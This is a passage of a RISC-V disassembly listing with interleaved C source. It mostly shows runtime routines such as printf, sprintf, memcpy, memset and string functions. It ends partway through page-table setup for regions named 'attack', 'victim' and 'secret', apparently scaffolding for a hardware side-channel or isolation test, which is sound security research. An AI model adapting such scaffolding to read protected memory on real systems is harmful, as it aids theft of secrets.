    case 'p':
      static_assert(sizeof(long) == sizeof(void*));
      lflag = 1;
    80001e0c:	00100793          	li	a5,1
    80001e10:	fcf42823          	sw	a5,-48(s0)
      putch('0', putdat);
    80001e14:	fa843783          	ld	a5,-88(s0)
    80001e18:	fa043583          	ld	a1,-96(s0)
    80001e1c:	03000513          	li	a0,48
    80001e20:	000780e7          	jalr	a5
      putch('x', putdat);
    80001e24:	fa843783          	ld	a5,-88(s0)
    80001e28:	fa043583          	ld	a1,-96(s0)
    80001e2c:	07800513          	li	a0,120
    80001e30:	000780e7          	jalr	a5
      /* fall through to 'x' */

    // (unsigned) hexadecimal
    case 'x':
      base = 16;
    80001e34:	01000793          	li	a5,16
    80001e38:	fcf42a23          	sw	a5,-44(s0)
    unsigned_number:
      num = getuint(&ap, lflag);
    80001e3c:	fd042703          	lw	a4,-48(s0)
    80001e40:	f9040793          	add	a5,s0,-112
    80001e44:	00070593          	mv	a1,a4
    80001e48:	00078513          	mv	a0,a5
    80001e4c:	b0dff0ef          	jal	80001958 <getuint>
    80001e50:	fca43c23          	sd	a0,-40(s0)
    signed_number:
      printnum(putch, putdat, num, base, width, padc);
    80001e54:	fd442683          	lw	a3,-44(s0)
    80001e58:	fc744783          	lbu	a5,-57(s0)
    80001e5c:	0007879b          	sext.w	a5,a5
    80001e60:	fcc42703          	lw	a4,-52(s0)
    80001e64:	fd843603          	ld	a2,-40(s0)
    80001e68:	fa043583          	ld	a1,-96(s0)
    80001e6c:	fa843503          	ld	a0,-88(s0)
    80001e70:	99dff0ef          	jal	8000180c <printnum>
      break;
    80001e74:	0340006f          	j	80001ea8 <vprintfmt+0x420>

    // escaped '%' character
    case '%':
      putch(ch, putdat);
    80001e78:	fa843783          	ld	a5,-88(s0)
    80001e7c:	fa043583          	ld	a1,-96(s0)
    80001e80:	00048513          	mv	a0,s1
    80001e84:	000780e7          	jalr	a5
      break;
    80001e88:	0200006f          	j	80001ea8 <vprintfmt+0x420>
      
    // unrecognized escape sequence - just print it literally
    default:
      putch('%', putdat);
    80001e8c:	fa843783          	ld	a5,-88(s0)
    80001e90:	fa043583          	ld	a1,-96(s0)
    80001e94:	02500513          	li	a0,37
    80001e98:	000780e7          	jalr	a5
      fmt = last_fmt;
    80001e9c:	fb843783          	ld	a5,-72(s0)
    80001ea0:	f8f43c23          	sd	a5,-104(s0)
      break;
    80001ea4:	00000013          	nop
    while ((ch = *(unsigned char *) fmt) != '%') {
    80001ea8:	c2dff06f          	j	80001ad4 <vprintfmt+0x4c>
        return;
    80001eac:	00000013          	nop
    }
  }
}
    80001eb0:	06813083          	ld	ra,104(sp)
    80001eb4:	06013403          	ld	s0,96(sp)
    80001eb8:	05813483          	ld	s1,88(sp)
    80001ebc:	05013903          	ld	s2,80(sp)
    80001ec0:	07010113          	add	sp,sp,112
    80001ec4:	00008067          	ret

0000000080001ec8 <printf>:

int printf(const char* fmt, ...)
{
    80001ec8:	f9010113          	add	sp,sp,-112
    80001ecc:	02113423          	sd	ra,40(sp)
    80001ed0:	02813023          	sd	s0,32(sp)
    80001ed4:	03010413          	add	s0,sp,48
    80001ed8:	fca43c23          	sd	a0,-40(s0)
    80001edc:	00b43423          	sd	a1,8(s0)
    80001ee0:	00c43823          	sd	a2,16(s0)
    80001ee4:	00d43c23          	sd	a3,24(s0)
    80001ee8:	02e43023          	sd	a4,32(s0)
    80001eec:	02f43423          	sd	a5,40(s0)
    80001ef0:	03043823          	sd	a6,48(s0)
    80001ef4:	03143c23          	sd	a7,56(s0)
  va_list ap;
  va_start(ap, fmt);
    80001ef8:	04040793          	add	a5,s0,64
    80001efc:	fcf43823          	sd	a5,-48(s0)
    80001f00:	fd043783          	ld	a5,-48(s0)
    80001f04:	fc878793          	add	a5,a5,-56
    80001f08:	fef43423          	sd	a5,-24(s0)

  vprintfmt((void*)putchar, 0, fmt, ap);
    80001f0c:	fe843783          	ld	a5,-24(s0)
    80001f10:	00078693          	mv	a3,a5
    80001f14:	fd843603          	ld	a2,-40(s0)
    80001f18:	00000593          	li	a1,0
    80001f1c:	fffff517          	auipc	a0,0xfffff
    80001f20:	7a450513          	add	a0,a0,1956 # 800016c0 <putchar>
    80001f24:	b65ff0ef          	jal	80001a88 <vprintfmt>

  va_end(ap);
  return 0; // incorrect return value, but who cares, anyway?
    80001f28:	00000793          	li	a5,0
}
    80001f2c:	00078513          	mv	a0,a5
    80001f30:	02813083          	ld	ra,40(sp)
    80001f34:	02013403          	ld	s0,32(sp)
    80001f38:	07010113          	add	sp,sp,112
    80001f3c:	00008067          	ret

0000000080001f40 <sprintf_putch.0>:
  va_list ap;
  char* str0 = str;
  va_start(ap, fmt);

  void sprintf_putch(int ch, void** data)
  {
    80001f40:	fc010113          	add	sp,sp,-64
    80001f44:	02813c23          	sd	s0,56(sp)
    80001f48:	04010413          	add	s0,sp,64
    80001f4c:	00050793          	mv	a5,a0
    80001f50:	fcb43823          	sd	a1,-48(s0)
    80001f54:	fcf42e23          	sw	a5,-36(s0)
    80001f58:	fc743423          	sd	t2,-56(s0)
    char** pstr = (char**)data;
    80001f5c:	fd043783          	ld	a5,-48(s0)
    80001f60:	fef43423          	sd	a5,-24(s0)
    **pstr = ch;
    80001f64:	fe843783          	ld	a5,-24(s0)
    80001f68:	0007b783          	ld	a5,0(a5)
    80001f6c:	fdc42703          	lw	a4,-36(s0)
    80001f70:	0ff77713          	zext.b	a4,a4
    80001f74:	00e78023          	sb	a4,0(a5)
    (*pstr)++;
    80001f78:	fe843783          	ld	a5,-24(s0)
    80001f7c:	0007b783          	ld	a5,0(a5)
    80001f80:	00178713          	add	a4,a5,1
    80001f84:	fe843783          	ld	a5,-24(s0)
    80001f88:	00e7b023          	sd	a4,0(a5)
  }
    80001f8c:	00000013          	nop
    80001f90:	03813403          	ld	s0,56(sp)
    80001f94:	04010113          	add	sp,sp,64
    80001f98:	00008067          	ret

0000000080001f9c <sprintf>:
{
    80001f9c:	ef010113          	add	sp,sp,-272
    80001fa0:	0c113c23          	sd	ra,216(sp)
    80001fa4:	0c813823          	sd	s0,208(sp)
    80001fa8:	0e010413          	add	s0,sp,224
    80001fac:	f2a43c23          	sd	a0,-200(s0)
    80001fb0:	f2b43823          	sd	a1,-208(s0)
    80001fb4:	00c43023          	sd	a2,0(s0)
    80001fb8:	00d43423          	sd	a3,8(s0)
    80001fbc:	00e43823          	sd	a4,16(s0)
    80001fc0:	00f43c23          	sd	a5,24(s0)
    80001fc4:	03043023          	sd	a6,32(s0)
    80001fc8:	03143423          	sd	a7,40(s0)
int	feof (FILE *);
int	ferror (FILE *);
void    perror (const char *);
#ifndef _REENT_ONLY
FILE *	fopen (const char *__restrict _name, const char *__restrict _type);
int	sprintf (char *__restrict, const char *__restrict, ...)
    80001fcc:	03040793          	add	a5,s0,48
    80001fd0:	f2f43423          	sd	a5,-216(s0)
    80001fd4:	f2843783          	ld	a5,-216(s0)
    80001fd8:	fcf43c23          	sd	a5,-40(s0)
    80001fdc:	f4840793          	add	a5,s0,-184
    80001fe0:	f4840713          	add	a4,s0,-184
    80001fe4:	39700693          	li	a3,919
    80001fe8:	00d7a023          	sw	a3,0(a5)
    80001fec:	0183b6b7          	lui	a3,0x183b
    80001ff0:	28368693          	add	a3,a3,643 # 183b283 <threadsense.2+0x183b1ff>
    80001ff4:	00d7a223          	sw	a3,4(a5)
    80001ff8:	0103b6b7          	lui	a3,0x103b
    80001ffc:	38368693          	add	a3,a3,899 # 103b383 <threadsense.2+0x103b2ff>
    80002000:	00d7a423          	sw	a3,8(a5)
    80002004:	000286b7          	lui	a3,0x28
    80002008:	06768693          	add	a3,a3,103 # 28067 <threadsense.2+0x27fe3>
    8000200c:	00d7a623          	sw	a3,12(a5)
    80002010:	00e7b823          	sd	a4,16(a5)
    80002014:	00000717          	auipc	a4,0x0
    80002018:	f2c70713          	add	a4,a4,-212 # 80001f40 <sprintf_putch.0>
    8000201c:	00e7bc23          	sd	a4,24(a5)
    80002020:	0000100f          	fence.i
  char* str0 = str;
    80002024:	f3843783          	ld	a5,-200(s0)
    80002028:	fef43423          	sd	a5,-24(s0)
  va_start(ap, fmt);
    8000202c:	03040793          	add	a5,s0,48
    80002030:	f2f43423          	sd	a5,-216(s0)
    80002034:	f2843783          	ld	a5,-216(s0)
    80002038:	fd078793          	add	a5,a5,-48
    8000203c:	fef43023          	sd	a5,-32(s0)

  vprintfmt(sprintf_putch, (void**)&str, fmt, ap);
    80002040:	fe043703          	ld	a4,-32(s0)
    80002044:	f4840793          	add	a5,s0,-184
    80002048:	00078513          	mv	a0,a5
    8000204c:	f3840793          	add	a5,s0,-200
    80002050:	00070693          	mv	a3,a4
    80002054:	f3043603          	ld	a2,-208(s0)
    80002058:	00078593          	mv	a1,a5
    8000205c:	a2dff0ef          	jal	80001a88 <vprintfmt>
  *str = 0;
    80002060:	f3843783          	ld	a5,-200(s0)
    80002064:	00078023          	sb	zero,0(a5)

  va_end(ap);
  return str - str0;
    80002068:	f3843703          	ld	a4,-200(s0)
    8000206c:	fe843783          	ld	a5,-24(s0)
    80002070:	40f707b3          	sub	a5,a4,a5
    80002074:	0007879b          	sext.w	a5,a5
}
    80002078:	00078513          	mv	a0,a5
    8000207c:	0d813083          	ld	ra,216(sp)
    80002080:	0d013403          	ld	s0,208(sp)
    80002084:	11010113          	add	sp,sp,272
    80002088:	00008067          	ret

000000008000208c <memcpy>:

void* memcpy(void* dest, const void* src, size_t len)
{
    8000208c:	fb010113          	add	sp,sp,-80
    80002090:	04813423          	sd	s0,72(sp)
    80002094:	05010413          	add	s0,sp,80
    80002098:	fca43423          	sd	a0,-56(s0)
    8000209c:	fcb43023          	sd	a1,-64(s0)
    800020a0:	fac43c23          	sd	a2,-72(s0)
  if ((((uintptr_t)dest | (uintptr_t)src | len) & (sizeof(uintptr_t)-1)) == 0) {
    800020a4:	fc843703          	ld	a4,-56(s0)
    800020a8:	fc043783          	ld	a5,-64(s0)
    800020ac:	00f76733          	or	a4,a4,a5
    800020b0:	fb843783          	ld	a5,-72(s0)
    800020b4:	00f767b3          	or	a5,a4,a5
    800020b8:	0077f793          	and	a5,a5,7
    800020bc:	04079863          	bnez	a5,8000210c <memcpy+0x80>
    const uintptr_t* s = src;
    800020c0:	fc043783          	ld	a5,-64(s0)
    800020c4:	fef43423          	sd	a5,-24(s0)
    uintptr_t *d = dest;
    800020c8:	fc843783          	ld	a5,-56(s0)
    800020cc:	fef43023          	sd	a5,-32(s0)
    while (d < (uintptr_t*)(dest + len))
    800020d0:	0240006f          	j	800020f4 <memcpy+0x68>
      *d++ = *s++;
    800020d4:	fe843703          	ld	a4,-24(s0)
    800020d8:	00870793          	add	a5,a4,8
    800020dc:	fef43423          	sd	a5,-24(s0)
    800020e0:	fe043783          	ld	a5,-32(s0)
    800020e4:	00878693          	add	a3,a5,8
    800020e8:	fed43023          	sd	a3,-32(s0)
    800020ec:	00073703          	ld	a4,0(a4)
    800020f0:	00e7b023          	sd	a4,0(a5)
    while (d < (uintptr_t*)(dest + len))
    800020f4:	fc843703          	ld	a4,-56(s0)
    800020f8:	fb843783          	ld	a5,-72(s0)
    800020fc:	00f707b3          	add	a5,a4,a5
    80002100:	fe043703          	ld	a4,-32(s0)
    80002104:	fcf768e3          	bltu	a4,a5,800020d4 <memcpy+0x48>
    80002108:	04c0006f          	j	80002154 <memcpy+0xc8>
  } else {
    const char* s = src;
    8000210c:	fc043783          	ld	a5,-64(s0)
    80002110:	fcf43c23          	sd	a5,-40(s0)
    char *d = dest;
    80002114:	fc843783          	ld	a5,-56(s0)
    80002118:	fcf43823          	sd	a5,-48(s0)
    while (d < (char*)(dest + len))
    8000211c:	0240006f          	j	80002140 <memcpy+0xb4>
      *d++ = *s++;
    80002120:	fd843703          	ld	a4,-40(s0)
    80002124:	00170793          	add	a5,a4,1
    80002128:	fcf43c23          	sd	a5,-40(s0)
    8000212c:	fd043783          	ld	a5,-48(s0)
    80002130:	00178693          	add	a3,a5,1
    80002134:	fcd43823          	sd	a3,-48(s0)
    80002138:	00074703          	lbu	a4,0(a4)
    8000213c:	00e78023          	sb	a4,0(a5)
    while (d < (char*)(dest + len))
    80002140:	fc843703          	ld	a4,-56(s0)
    80002144:	fb843783          	ld	a5,-72(s0)
    80002148:	00f707b3          	add	a5,a4,a5
    8000214c:	fd043703          	ld	a4,-48(s0)
    80002150:	fcf768e3          	bltu	a4,a5,80002120 <memcpy+0x94>
  }
  return dest;
    80002154:	fc843783          	ld	a5,-56(s0)
}
    80002158:	00078513          	mv	a0,a5
    8000215c:	04813403          	ld	s0,72(sp)
    80002160:	05010113          	add	sp,sp,80
    80002164:	00008067          	ret

0000000080002168 <memset>:

void* memset(void* dest, int byte, size_t len)
{
    80002168:	fb010113          	add	sp,sp,-80
    8000216c:	04813423          	sd	s0,72(sp)
    80002170:	05010413          	add	s0,sp,80
    80002174:	fca43423          	sd	a0,-56(s0)
    80002178:	00058793          	mv	a5,a1
    8000217c:	fac43c23          	sd	a2,-72(s0)
    80002180:	fcf42223          	sw	a5,-60(s0)
  if ((((uintptr_t)dest | len) & (sizeof(uintptr_t)-1)) == 0) {
    80002184:	fc843703          	ld	a4,-56(s0)
    80002188:	fb843783          	ld	a5,-72(s0)
    8000218c:	00f767b3          	or	a5,a4,a5
    80002190:	0077f793          	and	a5,a5,7
    80002194:	08079263          	bnez	a5,80002218 <memset+0xb0>
    uintptr_t word = byte & 0xFF;
    80002198:	fc442783          	lw	a5,-60(s0)
    8000219c:	0ff7f793          	zext.b	a5,a5
    800021a0:	fcf43c23          	sd	a5,-40(s0)
    word |= word << 8;
    800021a4:	fd843783          	ld	a5,-40(s0)
    800021a8:	00879793          	sll	a5,a5,0x8
    800021ac:	fd843703          	ld	a4,-40(s0)
    800021b0:	00f767b3          	or	a5,a4,a5
    800021b4:	fcf43c23          	sd	a5,-40(s0)
    word |= word << 16;
    800021b8:	fd843783          	ld	a5,-40(s0)
    800021bc:	01079793          	sll	a5,a5,0x10
    800021c0:	fd843703          	ld	a4,-40(s0)
    800021c4:	00f767b3          	or	a5,a4,a5
    800021c8:	fcf43c23          	sd	a5,-40(s0)
    word |= word << 16 << 16;
    800021cc:	fd843783          	ld	a5,-40(s0)
    800021d0:	02079793          	sll	a5,a5,0x20
    800021d4:	fd843703          	ld	a4,-40(s0)
    800021d8:	00f767b3          	or	a5,a4,a5
    800021dc:	fcf43c23          	sd	a5,-40(s0)

    uintptr_t *d = dest;
    800021e0:	fc843783          	ld	a5,-56(s0)
    800021e4:	fef43423          	sd	a5,-24(s0)
    while (d < (uintptr_t*)(dest + len))
    800021e8:	0180006f          	j	80002200 <memset+0x98>
      *d++ = word;
    800021ec:	fe843783          	ld	a5,-24(s0)
    800021f0:	00878713          	add	a4,a5,8
    800021f4:	fee43423          	sd	a4,-24(s0)
    800021f8:	fd843703          	ld	a4,-40(s0)
    800021fc:	00e7b023          	sd	a4,0(a5)
    while (d < (uintptr_t*)(dest + len))
    80002200:	fc843703          	ld	a4,-56(s0)
    80002204:	fb843783          	ld	a5,-72(s0)
    80002208:	00f707b3          	add	a5,a4,a5
    8000220c:	fe843703          	ld	a4,-24(s0)
    80002210:	fcf76ee3          	bltu	a4,a5,800021ec <memset+0x84>
    80002214:	03c0006f          	j	80002250 <memset+0xe8>
  } else {
    char *d = dest;
    80002218:	fc843783          	ld	a5,-56(s0)
    8000221c:	fef43023          	sd	a5,-32(s0)
    while (d < (char*)(dest + len))
    80002220:	01c0006f          	j	8000223c <memset+0xd4>
      *d++ = byte;
    80002224:	fe043783          	ld	a5,-32(s0)
    80002228:	00178713          	add	a4,a5,1
    8000222c:	fee43023          	sd	a4,-32(s0)
    80002230:	fc442703          	lw	a4,-60(s0)
    80002234:	0ff77713          	zext.b	a4,a4
    80002238:	00e78023          	sb	a4,0(a5)
    while (d < (char*)(dest + len))
    8000223c:	fc843703          	ld	a4,-56(s0)
    80002240:	fb843783          	ld	a5,-72(s0)
    80002244:	00f707b3          	add	a5,a4,a5
    80002248:	fe043703          	ld	a4,-32(s0)
    8000224c:	fcf76ce3          	bltu	a4,a5,80002224 <memset+0xbc>
  }
  return dest;
    80002250:	fc843783          	ld	a5,-56(s0)
}
    80002254:	00078513          	mv	a0,a5
    80002258:	04813403          	ld	s0,72(sp)
    8000225c:	05010113          	add	sp,sp,80
    80002260:	00008067          	ret

0000000080002264 <strlen>:

size_t strlen(const char *s)
{
    80002264:	fd010113          	add	sp,sp,-48
    80002268:	02813423          	sd	s0,40(sp)
    8000226c:	03010413          	add	s0,sp,48
    80002270:	fca43c23          	sd	a0,-40(s0)
  const char *p = s;
    80002274:	fd843783          	ld	a5,-40(s0)
    80002278:	fef43423          	sd	a5,-24(s0)
  while (*p)
    8000227c:	0100006f          	j	8000228c <strlen+0x28>
    p++;
    80002280:	fe843783          	ld	a5,-24(s0)
    80002284:	00178793          	add	a5,a5,1
    80002288:	fef43423          	sd	a5,-24(s0)
  while (*p)
    8000228c:	fe843783          	ld	a5,-24(s0)
    80002290:	0007c783          	lbu	a5,0(a5)
    80002294:	fe0796e3          	bnez	a5,80002280 <strlen+0x1c>
  return p - s;
    80002298:	fe843703          	ld	a4,-24(s0)
    8000229c:	fd843783          	ld	a5,-40(s0)
    800022a0:	40f707b3          	sub	a5,a4,a5
}
    800022a4:	00078513          	mv	a0,a5
    800022a8:	02813403          	ld	s0,40(sp)
    800022ac:	03010113          	add	sp,sp,48
    800022b0:	00008067          	ret

00000000800022b4 <strnlen>:

size_t strnlen(const char *s, size_t n)
{
    800022b4:	fd010113          	add	sp,sp,-48
    800022b8:	02813423          	sd	s0,40(sp)
    800022bc:	03010413          	add	s0,sp,48
    800022c0:	fca43c23          	sd	a0,-40(s0)
    800022c4:	fcb43823          	sd	a1,-48(s0)
  const char *p = s;
    800022c8:	fd843783          	ld	a5,-40(s0)
    800022cc:	fef43423          	sd	a5,-24(s0)
  while (n-- && *p)
    800022d0:	0100006f          	j	800022e0 <strnlen+0x2c>
    p++;
    800022d4:	fe843783          	ld	a5,-24(s0)
    800022d8:	00178793          	add	a5,a5,1
    800022dc:	fef43423          	sd	a5,-24(s0)
  while (n-- && *p)
    800022e0:	fd043783          	ld	a5,-48(s0)
    800022e4:	fff78713          	add	a4,a5,-1
    800022e8:	fce43823          	sd	a4,-48(s0)
    800022ec:	00078863          	beqz	a5,800022fc <strnlen+0x48>
    800022f0:	fe843783          	ld	a5,-24(s0)
    800022f4:	0007c783          	lbu	a5,0(a5)
    800022f8:	fc079ee3          	bnez	a5,800022d4 <strnlen+0x20>
  return p - s;
    800022fc:	fe843703          	ld	a4,-24(s0)
    80002300:	fd843783          	ld	a5,-40(s0)
    80002304:	40f707b3          	sub	a5,a4,a5
}
    80002308:	00078513          	mv	a0,a5
    8000230c:	02813403          	ld	s0,40(sp)
    80002310:	03010113          	add	sp,sp,48
    80002314:	00008067          	ret

0000000080002318 <strcmp>:

int strcmp(const char* s1, const char* s2)
{
    80002318:	fd010113          	add	sp,sp,-48
    8000231c:	02813423          	sd	s0,40(sp)
    80002320:	03010413          	add	s0,sp,48
    80002324:	fca43c23          	sd	a0,-40(s0)
    80002328:	fcb43823          	sd	a1,-48(s0)
  unsigned char c1, c2;

  do {
    c1 = *s1++;
    8000232c:	fd843783          	ld	a5,-40(s0)
    80002330:	00178713          	add	a4,a5,1
    80002334:	fce43c23          	sd	a4,-40(s0)
    80002338:	0007c783          	lbu	a5,0(a5)
    8000233c:	fef407a3          	sb	a5,-17(s0)
    c2 = *s2++;
    80002340:	fd043783          	ld	a5,-48(s0)
    80002344:	00178713          	add	a4,a5,1
    80002348:	fce43823          	sd	a4,-48(s0)
    8000234c:	0007c783          	lbu	a5,0(a5)
    80002350:	fef40723          	sb	a5,-18(s0)
  } while (c1 != 0 && c1 == c2);
    80002354:	fef44783          	lbu	a5,-17(s0)
    80002358:	0ff7f793          	zext.b	a5,a5
    8000235c:	00078e63          	beqz	a5,80002378 <strcmp+0x60>
    80002360:	fef44783          	lbu	a5,-17(s0)
    80002364:	00078713          	mv	a4,a5
    80002368:	fee44783          	lbu	a5,-18(s0)
    8000236c:	0ff77713          	zext.b	a4,a4
    80002370:	0ff7f793          	zext.b	a5,a5
    80002374:	faf70ce3          	beq	a4,a5,8000232c <strcmp+0x14>

  return c1 - c2;
    80002378:	fef44783          	lbu	a5,-17(s0)
    8000237c:	0007871b          	sext.w	a4,a5
    80002380:	fee44783          	lbu	a5,-18(s0)
    80002384:	0007879b          	sext.w	a5,a5
    80002388:	40f707bb          	subw	a5,a4,a5
    8000238c:	0007879b          	sext.w	a5,a5
}
    80002390:	00078513          	mv	a0,a5
    80002394:	02813403          	ld	s0,40(sp)
    80002398:	03010113          	add	sp,sp,48
    8000239c:	00008067          	ret

00000000800023a0 <strcpy>:

char* strcpy(char* dest, const char* src)
{
    800023a0:	fd010113          	add	sp,sp,-48
    800023a4:	02813423          	sd	s0,40(sp)
    800023a8:	03010413          	add	s0,sp,48
    800023ac:	fca43c23          	sd	a0,-40(s0)
    800023b0:	fcb43823          	sd	a1,-48(s0)
  char* d = dest;
    800023b4:	fd843783          	ld	a5,-40(s0)
    800023b8:	fef43423          	sd	a5,-24(s0)
  while ((*d++ = *src++))
    800023bc:	00000013          	nop
    800023c0:	fd043703          	ld	a4,-48(s0)
    800023c4:	00170793          	add	a5,a4,1
    800023c8:	fcf43823          	sd	a5,-48(s0)
    800023cc:	fe843783          	ld	a5,-24(s0)
    800023d0:	00178693          	add	a3,a5,1
    800023d4:	fed43423          	sd	a3,-24(s0)
    800023d8:	00074703          	lbu	a4,0(a4)
    800023dc:	00e78023          	sb	a4,0(a5)
    800023e0:	0007c783          	lbu	a5,0(a5)
    800023e4:	fc079ee3          	bnez	a5,800023c0 <strcpy+0x20>
    ;
  return dest;
    800023e8:	fd843783          	ld	a5,-40(s0)
}
    800023ec:	00078513          	mv	a0,a5
    800023f0:	02813403          	ld	s0,40(sp)
    800023f4:	03010113          	add	sp,sp,48
    800023f8:	00008067          	ret

00000000800023fc <atol>:

long atol(const char* str)
{
    800023fc:	fd010113          	add	sp,sp,-48
    80002400:	02813423          	sd	s0,40(sp)
    80002404:	03010413          	add	s0,sp,48
    80002408:	fca43c23          	sd	a0,-40(s0)
  long res = 0;
    8000240c:	fe043423          	sd	zero,-24(s0)
  int sign = 0;
    80002410:	fe042223          	sw	zero,-28(s0)

  while (*str == ' ')
    80002414:	0100006f          	j	80002424 <atol+0x28>
    str++;
    80002418:	fd843783          	ld	a5,-40(s0)
    8000241c:	00178793          	add	a5,a5,1
    80002420:	fcf43c23          	sd	a5,-40(s0)
  while (*str == ' ')
    80002424:	fd843783          	ld	a5,-40(s0)
    80002428:	0007c783          	lbu	a5,0(a5)
    8000242c:	00078713          	mv	a4,a5
    80002430:	02000793          	li	a5,32
    80002434:	fef702e3          	beq	a4,a5,80002418 <atol+0x1c>

  if (*str == '-' || *str == '+') {
    80002438:	fd843783          	ld	a5,-40(s0)
    8000243c:	0007c783          	lbu	a5,0(a5)
    80002440:	00078713          	mv	a4,a5
    80002444:	02d00793          	li	a5,45
    80002448:	00f70c63          	beq	a4,a5,80002460 <atol+0x64>
    8000244c:	fd843783          	ld	a5,-40(s0)
    80002450:	0007c783          	lbu	a5,0(a5)
    80002454:	00078713          	mv	a4,a5
    80002458:	02b00793          	li	a5,43
    8000245c:	06f71c63          	bne	a4,a5,800024d4 <atol+0xd8>
    sign = *str == '-';
    80002460:	fd843783          	ld	a5,-40(s0)
    80002464:	0007c783          	lbu	a5,0(a5)
    80002468:	0007871b          	sext.w	a4,a5
    8000246c:	02d00793          	li	a5,45
    80002470:	40f707b3          	sub	a5,a4,a5
    80002474:	0017b793          	seqz	a5,a5
    80002478:	0ff7f793          	zext.b	a5,a5
    8000247c:	fef42223          	sw	a5,-28(s0)
    str++;
    80002480:	fd843783          	ld	a5,-40(s0)
    80002484:	00178793          	add	a5,a5,1
    80002488:	fcf43c23          	sd	a5,-40(s0)
  }

  while (*str) {
    8000248c:	0480006f          	j	800024d4 <atol+0xd8>
    res *= 10;
    80002490:	fe843703          	ld	a4,-24(s0)
    80002494:	00070793          	mv	a5,a4
    80002498:	00279793          	sll	a5,a5,0x2
    8000249c:	00e787b3          	add	a5,a5,a4
    800024a0:	00179793          	sll	a5,a5,0x1
    800024a4:	fef43423          	sd	a5,-24(s0)
    res += *str++ - '0';
    800024a8:	fd843783          	ld	a5,-40(s0)
    800024ac:	00178713          	add	a4,a5,1
    800024b0:	fce43c23          	sd	a4,-40(s0)
    800024b4:	0007c783          	lbu	a5,0(a5)
    800024b8:	0007879b          	sext.w	a5,a5
    800024bc:	fd07879b          	addw	a5,a5,-48
    800024c0:	0007879b          	sext.w	a5,a5
    800024c4:	00078713          	mv	a4,a5
    800024c8:	fe843783          	ld	a5,-24(s0)
    800024cc:	00e787b3          	add	a5,a5,a4
    800024d0:	fef43423          	sd	a5,-24(s0)
  while (*str) {
    800024d4:	fd843783          	ld	a5,-40(s0)
    800024d8:	0007c783          	lbu	a5,0(a5)
    800024dc:	fa079ae3          	bnez	a5,80002490 <atol+0x94>
  }

  return sign ? -res : res;
    800024e0:	fe442783          	lw	a5,-28(s0)
    800024e4:	0007879b          	sext.w	a5,a5
    800024e8:	00078863          	beqz	a5,800024f8 <atol+0xfc>
    800024ec:	fe843783          	ld	a5,-24(s0)
    800024f0:	40f007b3          	neg	a5,a5
    800024f4:	0080006f          	j	800024fc <atol+0x100>
    800024f8:	fe843783          	ld	a5,-24(s0)
}
    800024fc:	00078513          	mv	a0,a5
    80002500:	02813403          	ld	s0,40(sp)
    80002504:	03010113          	add	sp,sp,48
    80002508:	00008067          	ret

000000008000250c <lfsr63>:
extern void victim();
extern void attack();

pte_t pt[NPT][PTES_PER_PT] __attribute__((aligned(PGSIZE)));

static uint64_t lfsr63(uint64_t x) {
    8000250c:	fd010113          	add	sp,sp,-48
    80002510:	02813423          	sd	s0,40(sp)
    80002514:	03010413          	add	s0,sp,48
    80002518:	fca43c23          	sd	a0,-40(s0)
    uint64_t bit = (x ^ (x >> 1)) & 1;
    8000251c:	fd843783          	ld	a5,-40(s0)
    80002520:	0017d713          	srl	a4,a5,0x1
    80002524:	fd843783          	ld	a5,-40(s0)
    80002528:	00f747b3          	xor	a5,a4,a5
    8000252c:	0017f793          	and	a5,a5,1
    80002530:	fef43423          	sd	a5,-24(s0)
    return (x >> 1) | (bit << 62);
    80002534:	fd843783          	ld	a5,-40(s0)
    80002538:	0017d713          	srl	a4,a5,0x1
    8000253c:	fe843783          	ld	a5,-24(s0)
    80002540:	03e79793          	sll	a5,a5,0x3e
    80002544:	00f767b3          	or	a5,a4,a5
}
    80002548:	00078513          	mv	a0,a5
    8000254c:	02813403          	ld	s0,40(sp)
    80002550:	03010113          	add	sp,sp,48
    80002554:	00008067          	ret

0000000080002558 <vm_boot>:

void vm_boot()
{
    80002558:	fe010113          	add	sp,sp,-32
    8000255c:	00813c23          	sd	s0,24(sp)
    80002560:	02010413          	add	s0,sp,32
    /* Set VM exactly same as the physical memory */
    // 0x80000000
    l1pt[L1_PT_IDX(DRAM_BASE)] = PPN(l2pt) | PTE_V;
    80002564:	00002797          	auipc	a5,0x2
    80002568:	a9c78793          	add	a5,a5,-1380 # 80004000 <pt+0x1000>
    8000256c:	00c7d793          	srl	a5,a5,0xc
    80002570:	00a79793          	sll	a5,a5,0xa
    80002574:	0017e713          	or	a4,a5,1
    80002578:	00001797          	auipc	a5,0x1
    8000257c:	a8878793          	add	a5,a5,-1400 # 80003000 <pt>
    80002580:	00e7b823          	sd	a4,16(a5)

    // [.text.init, .bss, .tohost, .text] 0x80000000
    l2pt[L2_PT_IDX(DRAM_BASE)] = PPN(DRAM_BASE) | code_flag | data_flag;
    80002584:	00001717          	auipc	a4,0x1
    80002588:	a7c70713          	add	a4,a4,-1412 # 80003000 <pt>
    8000258c:	000017b7          	lui	a5,0x1
    80002590:	00f707b3          	add	a5,a4,a5
    80002594:	20000737          	lui	a4,0x20000
    80002598:	0cf70713          	add	a4,a4,207 # 200000cf <threadsense.2+0x2000004b>
    8000259c:	00e7b023          	sd	a4,0(a5) # 1000 <threadsense.2+0xf7c>

    // [.text.attack] 0x80200000
    l2pt[L2_PT_IDX(attack)] = PPN(attack) | code_flag | data_flag;
    800025a0:	001fe797          	auipc	a5,0x1fe
    800025a4:	a6078793          	add	a5,a5,-1440 # 80200000 <attack>
    800025a8:	00c7d793          	srl	a5,a5,0xc
    800025ac:	00a79713          	sll	a4,a5,0xa
    800025b0:	001fe797          	auipc	a5,0x1fe
    800025b4:	a5078793          	add	a5,a5,-1456 # 80200000 <attack>
    800025b8:	0157d793          	srl	a5,a5,0x15
    800025bc:	1ff7f793          	and	a5,a5,511
    800025c0:	0cf76713          	or	a4,a4,207
    800025c4:	00001697          	auipc	a3,0x1
    800025c8:	a3c68693          	add	a3,a3,-1476 # 80003000 <pt>
    800025cc:	20078793          	add	a5,a5,512
    800025d0:	00379793          	sll	a5,a5,0x3
    800025d4:	00f687b3          	add	a5,a3,a5
    800025d8:	00e7b023          	sd	a4,0(a5)

    // [.data.secret] 0x80800000
    l2pt[L2_PT_IDX(secret)] = PPN(secret_l3pt) | PTE_V;
    800025dc:	00003797          	auipc	a5,0x3
    800025e0:	a2478793          	add	a5,a5,-1500 # 80005000 <pt+0x2000>
    800025e4:	00c7d793          	srl	a5,a5,0xc
    800025e8:	00a79713          	sll	a4,a5,0xa
    800025ec:	003fe797          	auipc	a5,0x3fe
    800025f0:	a1478793          	add	a5,a5,-1516 # 80400000 <secret>
    800025f4:	0157d793          	srl	a5,a5,0x15
    800025f8:	1ff7f793          	and	a5,a5,511
    800025fc:	00176713          	or	a4,a4,1
